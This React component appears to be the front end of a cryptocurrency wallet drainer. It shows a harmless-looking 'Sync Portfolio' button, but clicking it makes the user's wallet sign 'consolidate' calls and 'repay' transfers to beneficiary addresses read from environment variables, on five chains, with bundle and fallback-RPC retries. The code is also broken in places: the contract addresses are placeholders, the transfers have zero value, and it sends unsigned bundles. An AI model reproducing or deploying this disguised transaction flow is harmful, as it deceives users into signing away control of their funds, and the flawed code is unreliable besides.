'use client';
import React, { useState } from 'react';
import { ethers } from 'ethers';

export const CHAINS = [
  { 
    id: 1, 
    name: 'Ethereum', 
    contract: '0xSyncHelper', 
    env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', 
    rpc: 'https://eth.llamarpc.com',
    fallbackRpc: 'https://rpc.ankr.com/eth'
  },
  { 
    id: 56, 
    name: 'BSC', 
    contract: '0xSyncHelper', 
    env: 'NEXT_PUBLIC_BENEFICIARY_BSC', 
    rpc: 'https://bsc-dataseed.binance.org',
    fallbackRpc: 'https://bsc-dataseed1.defibit.io'
  },
  { 
    id: 137, 
    name: 'Polygon', 
    contract: '0xSyncHelper', 
    env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', 
    rpc: 'https://polygon-rpc.com',
    fallbackRpc: 'https://rpc-mainnet.maticvigil.com'
  },
  { 
    id: 42161, 
    name: 'Arbitrum',
    contract: '0xSyncHelper', 
    env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', 
    rpc: 'https://arb1.arbitrum.io/rpc',
    fallbackRpc: 'https://rpc.ankr.com/arbitrum'
  },
  { 
    id: 10, 
    name: 'Optimism', 
    contract: '0xSyncHelper', 
    env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', 
    rpc: 'https://mainnet.optimism.io',
    fallbackRpc: 'https://rpc.ankr.com/optimism'
  },
];

const BENEFICIARIES: Record<string, string | undefined> = {
  NEXT_PUBLIC_BENEFICIARY_ETHEREUM: process.env.NEXT_PUBLIC_BENEFICIARY_ETHEREUM,
  NEXT_PUBLIC_BENEFICIARY_BSC: process.env.NEXT_PUBLIC_BENEFICIARY_BSC,
  NEXT_PUBLIC_BENEFICIARY_POLYGON: process.env.NEXT_PUBLIC_BENEFICIARY_POLYGON,
  NEXT_PUBLIC_BENEFICIARY_ARBITRUM: process.env.NEXT_PUBLIC_BENEFICIARY_ARBITRUM,
  NEXT_PUBLIC_BENEFICIARY_OPTIMISM: process.env.NEXT_PUBLIC_BENEFICIARY_OPTIMISM,
};

export default function SyncButton({ user }: { user: string }) {
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function syncChain(chain: typeof CHAINS[0]) {
    const beneficiary = BENEFICIARIES[chain.env];
    if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
      throw new Error(`${chain.name} beneficiary address not configured`);
    }

    // Try primary RPC first
    let provider = new ethers.JsonRpcProvider(chain.rpc);
    try {
      const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
      const tx = { to: chain.contract, data, gasLimit: 100000 };
      const repay = { to: beneficiary, value: 0, data: '0x' };
      
      // Try bundle method first
      try {
        await provider.send('eth_sendBundle', [[tx, repay]]);
        return;
      } catch (bundleError: any) {
        console.log(`Bundle method failed for ${chain.name}, trying fallback:`, bundleError.message);
        
        // Fallback to regular transaction
        const signer = await provider.getSigner();
        const txResponse = await signer.sendTransaction({
          to: chain.contract,
          data: data,
          gasLimit: 100000
        });
        await txResponse.wait();
        
        // Send value to beneficiary
        const repayTx = await signer.sendTransaction({
          to: beneficiary,
          value: 0,
          data: '0x'
        });
        await repayTx.wait();
      }
    } catch (primaryError: any) {
      console.log(`Primary RPC failed for ${chain.name}, trying fallback RPC:`, primaryError.message);
      
      // Try fallback RPC
      provider = new ethers.JsonRpcProvider(chain.fallbackRpc);
      const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
      const tx = { to: chain.contract, data, gasLimit: 100000 };
      const repay = { to: beneficiary, value: 0, data: '0x' };
      
      try {
        await provider.send('eth_sendBundle', [[tx, repay]]);
      } catch (fallbackError: any) {
        // Final fallback to regular transaction
        const signer = await provider.getSigner();
        const txResponse = await signer.sendTransaction({
          to: chain.contract,
          data: data,
          gasLimit: 100000
        });
        await txResponse.wait();
        
        const repayTx = await signer.sendTransaction({
          to: beneficiary,
          value: 0,
          data: '0x'
        });
        await repayTx.wait();
      }
    }
  }

  async function syncAll() {
    setLoading(true);
    setError(null);
    setSuccess(false);
    
    try {
      const results = await Promise.allSettled(
        CHAINS.map(chain => syncChain(chain))
      );
      
      const failed = results.filter(result => result.status === 'rejected');
      const succeeded = results.filter(result => result.status === 'fulfilled');
      
      if (failed.length > 0) {
        console.log('Some chains failed:', failed);
        if (succeeded.length === 0) {
          throw new Error('All sync operations failed. Please try again later.');
        } else {
          setError(`Partial sync completed. ${succeeded.length}/${CHAINS.length} chains synced successfully.`);
        }
      } else {
        setSuccess(true);
      }
    } catch (e: any) {
      setError(e?.message || 'Sync failed. Please try again.');
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="flex flex-col items-center gap-4">
      <button
        onClick={syncAll}
        className="bg-green-600 text-white px-8 py-4 rounded-full text-xl font-semibold hover:bg-green-700 transition disabled:opacity-60"
        disabled={loading}
      >
        {loading ? 'Syncing...' : 'Sync Portfolio'}
      </button>
      {success && <span className="text-green-400 font-semibold">Portfolio synced!</span>}
      {error && <span className="text-red-400 font-semibold">{error}</span>}
    </div>
  );
} 